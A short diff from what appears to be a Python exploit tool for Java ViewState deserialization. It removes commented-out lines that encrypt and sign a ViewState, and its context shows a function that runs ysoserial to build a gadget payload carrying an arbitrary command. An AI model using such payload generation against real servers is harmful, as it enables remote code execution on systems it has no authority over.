@@ -7,13 +7,6 @@ from shlex import split
 from argparse import ArgumentParser
 import config
 
-#key_bytes = bytes(key, 'utf-8')
-#d = des(key,0, padmode=PAD_PKCS5)
-#hmac_sha1 = hmac.digest(key_bytes, viewstate, sha1)
-#viewstate = viewstate + hmac_sha1
-#encrypted_payload = b64encode(d.encrypt(viewstate))
-
-
 def generate_payload(payload_type: str, command: str) -> bytes:
     payload_generator = "java -jar ysoserial.jar %s '%s'" % (payload_type, command)
     process = Popen(split(payload_generator), stdout=PIPE, stderr=PIPE)
